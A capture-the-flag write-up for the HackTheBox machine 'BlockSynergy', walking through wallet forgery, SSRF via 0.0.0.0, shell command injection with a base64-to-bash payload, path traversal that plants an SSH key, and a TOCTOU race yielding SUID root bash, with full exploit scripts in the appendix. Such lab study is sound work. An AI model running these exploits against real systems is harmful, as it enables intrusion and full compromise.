---
title: "HTB BlockSynergy Writeup"
date: 2026-09-08
draft: false
tags: ["ctf", "htb"]
---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Initial Access](#initial-access)
3. [Flag (user.txt)](#flag-usertxt)
4. [Privilege Escalation to Root](#privilege-escalation-to-root)
5. [Appendix](#appendix)

---

## Reconnaissance

I started with an Nmap scan to enumerate open ports and services.

```bash
$ sudo nmap -sC -sV -Pn -n <TARGET_IP>
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | ssh | OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 |
| 8080/tcp | open | http | Werkzeug/Python Flask |

Browsing to `http://<TARGET_IP>:8080/` showed a blockchain wallet dashboard. The application allows users to create wallets, view the blockchain, and access a VIP area for node management and smart contracts.

![BlockSynergy Home Page](homescreen.png)

### Web Enumeration

The `/blockchain` endpoint publicly exposes the entire chain as JSON. Every block's `data` list contains transactions with `sender`, `receiver`, and `amount` fields. By summing these transactions per address, I could reconstruct the balance of every public key that has ever appeared on-chain including historical addresses.

The `/dashboard/wallet` endpoint accepts an `action=create` parameter to generate a fresh wallet, returning a valid `{private_key, public_key}` JSON pair. It also accepts `action=load` to import a wallet JSON file.

![BlockSynergy Dashboard](dashboard.png)

---

## Initial Access

### Discovery: Wallet Forgery

The wallet import function (`Wallet.load_wallet()`) accepts `private_key` and `public_key` fields independently. It never verifies that the supplied `private_key` mathematically derives the supplied `public_key`. 

The VIP area (`/dashboard/vip/nodes`) is gated by a check that the loaded wallet's public key has a `balance >= 10`. Since I could calculate the richest historical public key from the public `/blockchain` endpoint, I could forge a hybrid wallet containing my own fresh private key and the rich public key to bypass the VIP gate.

### SSRF via `0.0.0.0` Bypass

Once VIP access was obtained, the Node Management page (`/dashboard/vip/nodes`) allowed registering arbitrary "node" URLs. The server fetches these URLs server-side via `test_node/<id>`. 

The filter meant to block internal targets (`is_internal_address`) does a DNS-style resolve-then-check for loopback addresses. However, `0.0.0.0` needs no resolution and the kernel routes it to loopback on connect. This slipped past the check while still reaching admin-only, localhost-restricted routes. The `is_admin()` check only verifies `request.remote_addr == "127.0.0.1"`, which `0.0.0.0` satisfies.

### Command Injection via `ping_node`

Registering `http://0.0.0.0:8080/admin` and testing it returned the internal Admin Dashboard. The admin panel has a `ping_node` action that extracts an IP from a supplied URL and passes it to a shell command:

```python
ip = extract_ip_from_url(target)
output = subprocess.check_output(f"ping -w 4{ip}", shell=True, ...)
```

Because `shell=True` is used with unsanitized string interpolation, I could inject commands. `extract_ip_from_url` naively strips `http(s)://` and splits on `/`/`:`, so anything after the first `/` or `:` after the scheme survives into the shell command.

A second SSRF hop was required since `/admin/*` only accepts connections from `127.0.0.1`. I registered a command node and a second node pointing to the internal admin action, then triggered `test_node` on the second node. The payload used `$IFS` to substitute for blocked space characters and base64 to avoid shell-breaking characters:

```text
http://foo&echo$IFS''<BASE64_COMMAND>|base64$IFS''-d|bash&@<VPN_IP>:18083/
```

Using this primitive, I gained remote code execution as the `walter` user.

---

## Flag (user.txt)

```bash
walter@blocksynergy:~$ cat /home/walter/user.txt
```

---

## Privilege Escalation to Root

### Enumeration as walter

Using the RCE primitive, I enumerated listening services and found a second internal-only Flask app on `127.0.0.1:5000`, backed by source files in `/opt/staging/smart_contracts/` (world-readable).

### ContractEngine Path Traversal

Reading `contract.py` revealed a debug hook in `ContractEngine.run_hook()`. When `debug == "True"` and `hooks.<action> == "log"`, it builds a file path using an f-string:

```python
logfile = f"/opt/staging/smart_contracts/logs/{file}"
with open(logfile, "a") as f:
    f.write(content)
```

The `file`/`log_file` variable comes directly from attacker-controlled JSON (`__meta__`) with no path sanitization. This allows arbitrary file writes via `../` traversal.

I crafted a malicious contract JSON that set `log_file` to `../../../../home/hank/.ssh/authorized_keys` and `log_content` to my SSH public key. Uploading this contract to `:5000` and triggering the `mint` action wrote my key into `hank`'s `authorized_keys` file.

```bash
$ ssh -i hank_key hank@<TARGET_IP>
hank@blocksynergy:~$ id
uid=1001(hank) gid=1003(hank) groups=1003(hank),1001(developers)
```

### Recon as hank

`/etc/crontab` revealed a root cron job:
```text
*/5 * * * *	root /opt/backup/backup.sh
```

`/opt/blocksynergy` is `hank:developers` (group-writable). Running `pspy64` as hank while waiting for the cron cycle exposed the root backup command leaking FTP credentials and revealing the restore workflow.

Creating a sentinel file (`touch /opt/blocksynergy/restore`) triggers a root-run restore daemon. The daemon:
1. Checks the SHA-256 of the FTP archive against a root-owned manifest.
2. Downloads the validated archive into `/var/restore_work/_opt_blocksynergy.tar.gz` (which is `root:developers` and group-writable).
3. Extracts the downloaded copy as root with `tar xvf ... -C /`.

### The Vulnerability: TOCTOU Race

The checksum covers the FTP object, but the daemon then downloads a separate local copy into a group-writable directory and later extracts that local pathname. This creates a time-of-check/time-of-use gap.

Swapping the tar too early (before download/checksum) causes a `Checksum mismatch! Restore aborted.` error. The win condition is to atomically swap the **local downloaded copy** in `/var/restore_work/` after the download finishes but before the `tar xvf` extraction fires.

### Exploitation

#### Step 1: Build the malicious SUID archive

I created a tar archive containing `/bin/bash`, transformed to `/opt/blocksynergy/.hchk` and carrying root ownership plus mode 4755:

```bash
tar --numeric-owner --owner=0 --group=0 --mode=4755 \
  --transform='s|^bash$|opt/blocksynergy/.hchk|' \
  -czf /home/hank/suid.tar.gz -C /bin bash
```

#### Step 2: Win the race

I wrote a bash script (`race.sh`) that loops infinitely, waiting for the clean file to fully download (exceed 10MB), swaps it instantly using `mv -fT`, and then checks if the SUID binary landed.

```bash
hank@blocksynergy:~$ /home/hank/race.sh
=== Attempt 1 ===
[+] SWAPPED! Waiting for extraction...
[+] LANDED!
```

#### Step 3: Execute and collect root

The exploit successfully swapped the archive, and root extracted the SUID bash binary.

```bash
hank@blocksynergy:~$ /opt/blocksynergy/.hchk -p
.hchk-5.2# id
uid=1001(hank) gid=1003(hank) euid=0(root) groups=1003(hank),1001(developers)
```

### Root Flag

```bash
.hchk-5.2# cat /root/root.txt
```

---

## Appendix

### foothold.py

```python
#!/usr/bin/env python3
import html
import json
import re
import base64
from urllib.parse import urlencode
from collections import defaultdict
import requests

BASE = "http://10.129.246.236:8080"
VPN_IP = "10.10.17.7"
session = requests.Session()

def toast(text):
    m = re.findall(r'toast-body[^>]*>(.*?)<', text, re.S)
    return [x.strip() for x in m]

def register_node(url):
    r = session.post(
        f"{BASE}/dashboard/vip/nodes",
        data={"action": "register", "node": url},
        timeout=20,
    )
    print(f"  [register] {url[:60]}... -> {toast(r.text)}")

def find_node_id(url):
    page = session.get(f"{BASE}/dashboard/vip/nodes", timeout=20).text
    pairs = [
        (html.unescape(value), node_id)
        for value, node_id in re.findall(
            r'title="([^"]+)".*?testNode\(\'([0-9]+)\'\)', page, re.S
        )
    ]
    for value, node_id in reversed(pairs):
        if value == url:
            return node_id
    raise RuntimeError(f"Node ID not found for: {url}")

def test_node(url):
    node_id = find_node_id(url)
    r = session.get(
        f"{BASE}/dashboard/vip/nodes/test_node/{node_id}",
        timeout=60,
    )
    return r.text

print("[*] Creating fresh wallet...")
r = session.post(
    f"{BASE}/dashboard/wallet",
    data={"action": "create", "filename": "fresh"},
    timeout=20,
)
fresh = r.json()
print(f"    Fresh private key: {fresh['private_key'][:20]}...")

print("[*] Computing balances...")
chain = session.get(f"{BASE}/blockchain", timeout=20).json()
balances = defaultdict(int)

for block in chain:
    for tx in block.get("data", []):
        if not isinstance(tx, dict) or "amount" not in tx:
            continue
        amt = int(tx["amount"])
        sender = tx.get("sender")
        receiver = tx.get("receiver")
        if receiver:
            balances[receiver] += amt
        if sender and sender != "Blockchain_Reward":
            balances[sender] -= amt

vip_public_key, vip_balance = max(balances.items(), key=lambda x: x[1])
print(f"    Richest: {vip_public_key[:40]}... with {vip_balance} coins")

forged = {
    "private_key": fresh["private_key"],
    "public_key": vip_public_key,
}

r = session.post(
    f"{BASE}/dashboard/wallet",
    data={"action": "load"},
    files={
        "file": (
            "forged.json",
            json.dumps(forged),
            "application/json",
        )
    },
    timeout=20,
)
print(f"    Load wallet: {toast(r.text)}")

r = session.get(f"{BASE}/dashboard/info")
bal = re.search(r'Balance:?\s*(\d+)', r.text)
print(f"    Balance: {bal.group(1) if bal else 'NOT FOUND'}")

print("[*] SSRF to admin panel...")
admin_url = "http://0.0.0.0:8080/admin"
register_node(admin_url)

admin_html = test_node(admin_url)
if "Admin Dashboard" in admin_html:
    print("    [+] ADMIN PANEL REACHED via SSRF!")
else:
    print("    [-] Admin panel not found in response")
    print(admin_html[:500])

def execute(cmd):
    encoded = base64.b64encode(cmd.encode()).decode()
    command_node = (
        "http://foo&echo$IFS''"
        + encoded
        + "|base64$IFS''-d|bash&@"
        + VPN_IP
        + ":18083/"
    )
    register_node(command_node)

    internal_action = (
        "http://0.0.0.0:8080/admin/nodes/manage?"
        + urlencode({"action": "ping_node", "target": command_node})
    )
    register_node(internal_action)

    body = test_node(internal_action)
    outputs = [
        html.unescape(val).strip()
        for val in re.findall(r"<pre[^>]*>(.*?)</pre>", body, re.S)
        if html.unescape(val).strip()
    ]
    return "\n".join(outputs)

print("[*] Testing command execution...")
result = execute("id; hostname")
print("    [+] OUTPUT:")
for line in result.splitlines():
    print(f"        {line}")

print("[*] Grabbing user flag...")
flag = execute("cat /home/walter/user.txt")
print(f"    [+] USER FLAG: {flag}")
```

### race.sh

```bash
#!/bin/bash
F=/var/restore_work/_opt_blocksynergy.tar.gz
PAYLOAD=/home/hank/suid.tar.gz
DIAG=/opt/blocksynergy/.hchk

for i in 1 2 3 4 5; do
  echo "=== Attempt $i ==="
  rm -f /opt/blocksynergy/restore $F /var/restore_work/.swp $DIAG
  touch /opt/blocksynergy/restore
  
  SWAPPED=0
  END=$((SECONDS + 30))
  
  while [ $SECONDS -lt $END ]; do
    if [ -f "$F" ]; then
      SIZE=$(stat -c %s "$F" 2>/dev/null)
      if [ "$SIZE" -gt 10000000 ]; then
        cp "$PAYLOAD" /var/restore_work/.swp 2>/dev/null
        mv -fT /var/restore_work/.swp "$F" 2>/dev/null
        SWAPPED=1
        echo "[+] SWAPPED! Waiting for extraction..."
        break
      fi
    fi
    sleep 0.001
  done
  
  if [ $SWAPPED -eq 0 ]; then
    echo "[-] Download never completed. Retrying..."
    continue
  fi
  
  EXTRACTED=0
  END=$((SECONDS + 15))
  while [ $SECONDS -lt $END ]; do
    if [ -f "$DIAG" ]; then
      OWNER=$(stat -c%U "$DIAG")
      MODE=$(stat -c%a "$DIAG")
      if [ "$OWNER" = "root" ] && [ "$MODE" = "4755" ]; then
        echo "[+] LANDED!"
        exit 0
      fi
    fi
    sleep 0.1
  done
  echo "[-] Extraction missed. Retrying..."
done
echo "[-] Failed after 5 attempts."
exit 1
```

---

*Writeup by Mikias*
